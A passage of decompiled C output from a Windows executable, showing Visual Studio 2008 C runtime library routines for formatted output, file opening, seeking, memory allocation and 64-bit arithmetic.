          if (local_215 == 0x70) {
            local_21c = (int *)0x8;
LAB_00411830:
            local_260 = 7;
            goto LAB_0041185c;
          }
          if ((char)local_215 < 'e') goto LAB_00411a09;
          if ((char)local_215 < 'h') goto LAB_0041148d;
          if (local_215 == 0x69) goto LAB_004116cd;
          if (local_215 != 0x6e) {
            if (local_215 != 0x6f) goto LAB_00411a09;
            local_224 = (int *)0x8;
            if ((local_214 & 0x80) != 0) {
              local_214 = local_214 | 0x200;
            }
            goto LAB_004116de;
          }
          piVar3 = *(int **)_ArgList;
          local_228 = (int **)((int)_ArgList + 4);
          iVar7 = __get_printf_count_output();
          if (iVar7 == 0) goto switchD_004111e1_caseD_9;
          if ((local_214 & 0x20) == 0) {
            *piVar3 = local_22c;
          }
          else {
            *(wchar_t *)piVar3 = (wchar_t)local_22c;
          }
          local_25c = 1;
        }
        if (local_258 != (int *)0x0) {
          _free(local_258);
          local_258 = (int *)0x0;
        }
        break;
      default:
        goto switchD_004111e1_caseD_9;
      case 0xbad1abe1:
        break;
      }
      local_215 = *local_240;
      _Format = (char *)local_240;
      _ArgList = (va_list)local_228;
    } while (local_215 != 0);
    if ((local_244 == 0) || (local_244 == 7)) goto LAB_00411bd5;
    piVar3 = __errno();
    *piVar3 = 0x16;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_248 != '\0') {
    *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
  }
LAB_00411bee:
  iVar7 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar7;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __openfile
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __openfile(char *_Filename,char *_Mode,int _ShFlag,FILE *_File)

{
  char cVar1;
  bool bVar2;
  uchar uVar3;
  int *piVar4;
  int iVar5;
  errno_t eVar6;
  char *pcVar7;
  uchar *puVar8;
  uchar *puVar9;
  int local_14;
  int local_10;
  int local_c;
  uint local_8;
  
  local_8 = DAT_00423eb8;
  local_10 = 0;
  local_c = 0;
  local_14 = 0;
  for (pcVar7 = _Mode; *pcVar7 == ' '; pcVar7 = pcVar7 + 1) {
  }
  cVar1 = *pcVar7;
  if (cVar1 == 'a') {
    _Mode = (char *)0x109;
LAB_00411c8d:
    local_8 = DAT_00423eb8 | 2;
  }
  else {
    if (cVar1 != 'r') {
      if (cVar1 != 'w') {
        piVar4 = __errno();
        *piVar4 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return (FILE *)0x0;
      }
      _Mode = (char *)0x301;
      goto LAB_00411c8d;
    }
    local_8 = DAT_00423eb8 | 1;
    _Mode = (char *)0x0;
  }
  bVar2 = true;
  puVar8 = (uchar *)(pcVar7 + 1);
  uVar3 = *puVar8;
  if (uVar3 != '\0') {
    do {
      if (!bVar2) break;
      if ((char)uVar3 < 'T') {
        if (uVar3 == 'S') {
          if (local_c != 0) goto LAB_00411dc8;
          _Mode = (char *)((uint)_Mode | 0x20);
          local_c = 1;
        }
        else if (uVar3 != ' ') {
          if (uVar3 == '+') {
            if (((uint)_Mode & 2) != 0) goto LAB_00411dc8;
            _Mode = (char *)((uint)_Mode & 0xfffffffe | 2);
            local_8 = local_8 & 0xfffffffc | 0x80;
          }
          else if (uVar3 == ',') {
            local_14 = 1;
LAB_00411dc8:
            bVar2 = false;
          }
          else if (uVar3 == 'D') {
            if (((uint)_Mode & 0x40) != 0) goto LAB_00411dc8;
            _Mode = (char *)((uint)_Mode | 0x40);
          }
          else if (uVar3 == 'N') {
            _Mode = (char *)((uint)_Mode | 0x80);
          }
          else {
            if (uVar3 != 'R') goto LAB_00411e87;
            if (local_c != 0) goto LAB_00411dc8;
            _Mode = (char *)((uint)_Mode | 0x10);
            local_c = 1;
          }
        }
      }
      else if (uVar3 == 'T') {
        if (((uint)_Mode & 0x1000) != 0) goto LAB_00411dc8;
        _Mode = (char *)((uint)_Mode | 0x1000);
      }
      else if (uVar3 == 'b') {
        if (((uint)_Mode & 0xc000) != 0) goto LAB_00411dc8;
        _Mode = (char *)((uint)_Mode | 0x8000);
      }
      else if (uVar3 == 'c') {
        if (local_10 != 0) goto LAB_00411dc8;
        local_8 = local_8 | 0x4000;
        local_10 = 1;
      }
      else if (uVar3 == 'n') {
        if (local_10 != 0) goto LAB_00411dc8;
        local_8 = local_8 & 0xffffbfff;
        local_10 = 1;
      }
      else {
        if (uVar3 != 't') goto LAB_00411e87;
        if (((uint)_Mode & 0xc000) != 0) goto LAB_00411dc8;
        _Mode = (char *)((uint)_Mode | 0x4000);
      }
      puVar8 = puVar8 + 1;
      uVar3 = *puVar8;
    } while (uVar3 != '\0');
    if (local_14 != 0) {
      for (; *puVar8 == ' '; puVar8 = puVar8 + 1) {
      }
      iVar5 = __mbsnbcmp(&DAT_0041cb7c,puVar8,3);
      if (iVar5 != 0) goto LAB_00411e87;
      for (puVar8 = puVar8 + 3; *puVar8 == ' '; puVar8 = puVar8 + 1) {
      }
      if (*puVar8 != '=') goto LAB_00411e87;
      do {
        puVar9 = puVar8;
        puVar8 = puVar9 + 1;
      } while (*puVar8 == ' ');
      iVar5 = __mbsnbicmp(puVar8,(uchar *)s_UTF_8_0041cb80,5);
      if (iVar5 == 0) {
        puVar8 = puVar9 + 6;
        _Mode = (char *)((uint)_Mode | 0x40000);
      }
      else {
        iVar5 = __mbsnbicmp(puVar8,(uchar *)s_UTF_16LE_0041cb88,8);
        if (iVar5 == 0) {
          puVar8 = puVar9 + 9;
          _Mode = (char *)((uint)_Mode | 0x20000);
        }
        else {
          iVar5 = __mbsnbicmp(puVar8,(uchar *)s_UNICODE_0041cb94,7);
          if (iVar5 != 0) goto LAB_00411e87;
          puVar8 = puVar9 + 8;
          _Mode = (char *)((uint)_Mode | 0x10000);
        }
      }
    }
  }
  for (; *puVar8 == ' '; puVar8 = puVar8 + 1) {
  }
  if (*puVar8 == '\0') {
    eVar6 = __sopen_s(&local_14,_Filename,(int)_Mode,_ShFlag,0x180);
    if (eVar6 != 0) {
      return (FILE *)0x0;
    }
    _DAT_004237a8 = _DAT_004237a8 + 1;
    _File->_flag = local_8;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = local_14;
    return _File;
  }
LAB_00411e87:
  piVar4 = __errno();
  *piVar4 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return (FILE *)0x0;
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __lseek_nolock
// 
// Library: Visual Studio 2008 Release

long __cdecl __lseek_nolock(int _FileHandle,long _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  ulong uVar4;
  
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
    DVar3 = 0xffffffff;
  }
  else {
    DVar3 = SetFilePointer(hFile,_Offset,(PLONG)0x0,_Origin);
    if (DVar3 == 0xffffffff) {
      uVar4 = GetLastError();
    }
    else {
      uVar4 = 0;
    }
    if (uVar4 == 0) {
      pbVar1 = (byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
      *pbVar1 = *pbVar1 & 0xfd;
    }
    else {
      __dosmaperr(uVar4);
      DVar3 = 0xffffffff;
    }
  }
  return DVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseek
// 
// Library: Visual Studio 2008 Release

long __cdecl __lseek(int _FileHandle,long _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  long local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00424fd8)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00424fe0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __lseek_nolock(_FileHandle,_Offset,_Origin);
        }
        FUN_004120cf();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_004120cf(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __wchartodigit
// 
// Library: Visual Studio 2008 Release

int __cdecl __wchartodigit(ushort param_1)

{
  int iVar1;
  ushort uVar2;
  
  if (param_1 < 0x30) {
    return -1;
  }
  if (param_1 < 0x3a) {
    return param_1 - 0x30;
  }
  iVar1 = 0xff10;
  if (param_1 < 0xff10) {
    iVar1 = 0x660;
    if (param_1 < 0x660) {
      return -1;
    }
    if (param_1 < 0x66a) goto LAB_00412125;
    iVar1 = 0x6f0;
    if (param_1 < 0x6f0) {
      return -1;
    }
    if (param_1 < 0x6fa) goto LAB_00412125;
    iVar1 = 0x966;
    if (param_1 < 0x966) {
      return -1;
    }
    if (param_1 < 0x970) goto LAB_00412125;
    iVar1 = 0x9e6;
    if (param_1 < 0x9e6) {
      return -1;
    }
    if (param_1 < 0x9f0) goto LAB_00412125;
    iVar1 = 0xa66;
    if (param_1 < 0xa66) {
      return -1;
    }
    if (param_1 < 0xa70) goto LAB_00412125;
    iVar1 = 0xae6;
    if (param_1 < 0xae6) {
      return -1;
    }
    if (param_1 < 0xaf0) goto LAB_00412125;
    iVar1 = 0xb66;
    if (param_1 < 0xb66) {
      return -1;
    }
    if (param_1 < 0xb70) goto LAB_00412125;
    iVar1 = 0xc66;
    if (param_1 < 0xc66) {
      return -1;
    }
    if (param_1 < 0xc70) goto LAB_00412125;
    iVar1 = 0xce6;
    if (param_1 < 0xce6) {
      return -1;
    }
    if (param_1 < 0xcf0) goto LAB_00412125;
    iVar1 = 0xd66;
    if (param_1 < 0xd66) {
      return -1;
    }
    if (param_1 < 0xd70) goto LAB_00412125;
    iVar1 = 0xe50;
    if (param_1 < 0xe50) {
      return -1;
    }
    if (param_1 < 0xe5a) goto LAB_00412125;
    iVar1 = 0xed0;
    if (param_1 < 0xed0) {
      return -1;
    }
    if (param_1 < 0xeda) goto LAB_00412125;
    iVar1 = 0xf20;
    if (param_1 < 0xf20) {
      return -1;
    }
    if (param_1 < 0xf2a) goto LAB_00412125;
    iVar1 = 0x1040;
    if (param_1 < 0x1040) {
      return -1;
    }
    if (param_1 < 0x104a) goto LAB_00412125;
    iVar1 = 0x17e0;
    if (param_1 < 0x17e0) {
      return -1;
    }
    if (param_1 < 0x17ea) goto LAB_00412125;
    iVar1 = 0x1810;
    if (param_1 < 0x1810) {
      return -1;
    }
    uVar2 = 0x181a;
  }
  else {
    uVar2 = 0xff1a;
  }
  if (uVar2 <= param_1) {
    return -1;
  }
LAB_00412125:
  return (uint)param_1 - iVar1;
}



// Library Function - Single Match
//  __iswctype_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __iswctype_l(wint_t _C,wctype_t _Type,_locale_t _Locale)

{
  BOOL BVar1;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  if (_C == 0xffff) {
    local_8[0] = 0;
  }
  else if (_C < 0x100) {
    local_8[0] = *(ushort *)(PTR_DAT_00422e24 + (uint)_C * 2) & _Type;
  }
  else {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    BVar1 = ___crtGetStringTypeW(&local_18,1,(LPCWSTR)&_C,1,local_8);
    if (BVar1 == 0) {
      local_8[0] = 0;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return (uint)(local_8[0] & _Type);
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2008 Release

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __calloc_impl
// 
// Library: Visual Studio 2008 Release

int * __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  uint *_Size;
  uint *dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {
    _Size = (uint *)(param_1 * param_2);
    dwBytes = _Size;
    if (_Size == (uint *)0x0) {
      dwBytes = (uint *)0x1;
    }
    do {
      piVar1 = (int *)0x0;
      if (dwBytes < (uint *)0xffffffe1) {
        if ((DAT_0042510c == 3) &&
           (dwBytes = (uint *)((int)dwBytes + 0xfU & 0xfffffff0), _Size <= DAT_004250fc)) {
          __lock(4);
          piVar1 = ___sbh_alloc_block(_Size);
          FUN_00412470();
          if (piVar1 != (int *)0x0) {
            _memset(piVar1,0,(size_t)_Size);
            goto LAB_00412425;
          }
        }
        else {
LAB_00412425:
          if (piVar1 != (int *)0x0) {
            return piVar1;
          }
        }
        piVar1 = (int *)HeapAlloc(DAT_004237bc,8,(SIZE_T)dwBytes);
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_00423c60 == 0) {
        if (param_3 == (undefined4 *)0x0) {
          return (int *)0x0;
        }
        *param_3 = 0xc;
        return (int *)0x0;
      }
      iVar2 = __callnewh((size_t)dwBytes);
    } while (iVar2 != 0);
    if (param_3 != (undefined4 *)0x0) {
      *param_3 = 0xc;
    }
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0xc;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return (int *)0x0;
}



void FUN_00412470(void)

{
  FUN_0040e64c(4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00412492(void)

{
  _DAT_00424fd0 = 0;
  return;
}



// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (DAT_00423eb4 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00423eb4 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  int *piVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    piVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (piVar1 != (int *)0x0) {
      return piVar1;
    }
    if (DAT_00423eb4 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00423eb4 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_00423eb4 == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00423eb4 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  __tsopen_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl
__tsopen_nolock(undefined4 *param_1,LPCWSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint *in_EAX;
  errno_t eVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  DWORD DVar7;
  long lVar8;
  int iVar9;
  HANDLE pvVar10;
  byte bVar11;
  int unaff_EDI;
  int iVar12;
  bool bVar13;
  longlong lVar14;
  _SECURITY_ATTRIBUTES local_38;
  undefined4 local_28;
  uint local_24;
  HANDLE local_20;
  uint local_1c;
  DWORD local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar13 = (param_3 & 0x80) == 0;
  local_24 = 0;
  local_6 = 0;
  local_38.nLength = 0xc;
  local_38.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar13) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_38.bInheritHandle = (BOOL)bVar13;
  eVar3 = __get_fmode((int *)&local_24);
  if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_24 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_c = 0x80000000;
  }
  else {
    if (uVar4 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_c = 0x40000000;
        goto LAB_004126e5;
      }
    }
    else if (uVar4 != 2) goto LAB_004126a1;
    local_c = 0xc0000000;
  }
LAB_004126e5:
  if (param_4 == 0x10) {
    local_14 = 0;
  }
  else if (param_4 == 0x20) {
    local_14 = 1;
  }
  else if (param_4 == 0x30) {
    local_14 = 2;
  }
  else if (param_4 == 0x40) {
    local_14 = 3;
  }
  else {
    if (param_4 != 0x80) goto LAB_004126a1;
    local_14 = (uint)(local_c == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_18 = 3;
    }
    else if (uVar4 == 0x100) {
      local_18 = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_004127ea;
      if (uVar4 != 0x300) goto LAB_004126a1;
      local_18 = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_004127ea:
        local_18 = 5;
        goto LAB_00412799;
      }
      if (uVar4 != 0x700) {
LAB_004126a1:
        puVar5 = ___doserrno();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        piVar6 = __errno();
        *piVar6 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return 0x16;
      }
    }
    local_18 = 1;
  }
LAB_00412799:
  local_10 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_00423914 & param_5))) {
    local_10 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_10 = local_10 | 0x4000000;
    local_c = local_c | 0x10000;
    local_14 = local_14 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_10 = local_10 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_10 = local_10 | 0x10000000;
    }
  }
  else {
    local_10 = local_10 | 0x8000000;
  }
  uVar4 = __alloc_osfhnd();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    piVar6 = __errno();
    *piVar6 = 0x18;
    goto LAB_004128b2;
  }
  *param_1 = 1;
  local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
  if (local_20 == (HANDLE)0xffffffff) {
    if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_c = local_c & 0x7fffffff;
      local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
      if (local_20 != (HANDLE)0xffffffff) goto LAB_004128be;
    }
    pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    goto LAB_004128b2;
  }
LAB_004128be:
  DVar7 = GetFileType(local_20);
  if (DVar7 == 0) {
    pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    CloseHandle(local_20);
    if (DVar7 == 0) {
      piVar6 = __errno();
      *piVar6 = 0xd;
    }
    goto LAB_004128b2;
  }
  if (DVar7 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar7 == 3) {
    local_5 = local_5 | 8;
  }
  __set_osfhnd(*in_EAX,(intptr_t)local_20);
  bVar11 = local_5 | 1;
  *(byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar11;
  pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar2 = local_5 & 0x80;
    local_5 = bVar11;
    if (bVar2 == 0) goto LAB_00412c33;
    if ((param_3 & 2) == 0) goto LAB_004129f9;
    local_1c = __lseek_nolock(*in_EAX,-1,2);
    if (local_1c == 0xffffffff) {
      puVar5 = ___doserrno();
      bVar11 = local_5;
      if (*puVar5 == 0x83) goto LAB_004129f9;
    }
    else {
      local_28 = 0;
      iVar12 = __read_nolock(*in_EAX,&local_28,1);
      if ((((iVar12 != 0) || ((short)local_28 != 0x1a)) ||
          (iVar12 = __chsize_nolock(*in_EAX,CONCAT44(unaff_EDI,(int)local_1c >> 0x1f)), iVar12 != -1
          )) && (lVar8 = __lseek_nolock(*in_EAX,0,0), bVar11 = local_5, lVar8 != -1))
      goto LAB_004129f9;
    }
LAB_004129ab:
    __close_nolock(*in_EAX);
    goto LAB_004128b2;
  }
LAB_004129f9:
  local_5 = bVar11;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_24 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_24 & 0x74000;
      }
    }
    uVar4 = param_3 & 0x74000;
    if (uVar4 == 0x4000) {
      local_6 = 0;
    }
    else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
      if ((param_3 & 0x301) == 0x301) goto LAB_00412a68;
    }
    else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_00412a68:
      local_6 = 2;
    }
    else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
      local_6 = 1;
    }
    if (((param_3 & 0x70000) != 0) && (local_1c = 0, (local_5 & 0x40) == 0)) {
      uVar4 = local_c & 0xc0000000;
      if (uVar4 == 0x40000000) {
        if (local_18 == 0) goto LAB_00412c33;
        if (2 < local_18) {
          if (local_18 < 5) {
            lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
            if (lVar14 == 0) goto LAB_00412acd;
            lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
            uVar4 = (uint)lVar14 & (uint)((ulonglong)lVar14 >> 0x20);
            goto LAB_00412b99;
          }
LAB_00412ac4:
          if (local_18 != 5) goto LAB_00412c33;
        }
LAB_00412acd:
        iVar12 = 0;
        if (local_6 == 1) {
          local_1c = 0xbfbbef;
          local_18 = 3;
        }
        else {
          if (local_6 != 2) goto LAB_00412c33;
          local_1c = 0xfeff;
          local_18 = 2;
        }
        do {
          iVar9 = __write(*in_EAX,(void *)((int)&local_1c + iVar12),local_18 - iVar12);
          if (iVar9 == -1) goto LAB_004129ab;
          iVar12 = iVar12 + iVar9;
        } while (iVar12 < (int)local_18);
      }
      else {
        if (uVar4 != 0x80000000) {
          if ((uVar4 == 0xc0000000) && (local_18 != 0)) {
            if (2 < local_18) {
              if (4 < local_18) goto LAB_00412ac4;
              lVar14 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
              if (lVar14 != 0) {
                lVar14 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
                if (lVar14 == -1) goto LAB_004129ab;
                goto LAB_00412b1e;
              }
            }
            goto LAB_00412acd;
          }
          goto LAB_00412c33;
        }
LAB_00412b1e:
        iVar12 = __read_nolock(*in_EAX,&local_1c,3);
        if (iVar12 == -1) goto LAB_004129ab;
        if (iVar12 == 2) {
LAB_00412ba7:
          if ((local_1c & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar6 = __errno();
            *piVar6 = 0x16;
            return 0x16;
          }
          if ((local_1c & 0xffff) == 0xfeff) {
            lVar8 = __lseek_nolock(*in_EAX,2,0);
            if (lVar8 == -1) goto LAB_004129ab;
            local_6 = 2;
            goto LAB_00412c33;
          }
        }
        else if (iVar12 == 3) {
          if (local_1c == 0xbfbbef) {
            local_6 = 1;
            goto LAB_00412c33;
          }
          goto LAB_00412ba7;
        }
        uVar4 = __lseek_nolock(*in_EAX,0,0);
LAB_00412b99:
        if (uVar4 == 0xffffffff) goto LAB_004129ab;
      }
    }
  }
LAB_00412c33:
  uVar4 = local_c;
  pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
  pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
  if ((local_7 == 0) && ((param_3 & 8) != 0)) {
    pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 | 0x20;
  }
  if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
    CloseHandle(local_20);
    pvVar10 = CreateFileW(param_2,uVar4 & 0x7fffffff,local_14,&local_38,3,local_10,(HANDLE)0x0);
    if (pvVar10 == (HANDLE)0xffffffff) {
      DVar7 = GetLastError();
      __dosmaperr(DVar7);
      pbVar1 = (byte *)((&DAT_00424fe0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
      __free_osfhnd(*in_EAX);
LAB_004128b2:
      piVar6 = __errno();
      return *piVar6;
    }
    *(HANDLE *)((*in_EAX & 0x1f) * 0x40 + (&DAT_00424fe0)[(int)*in_EAX >> 5]) = pvVar10;
  }
  return 0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
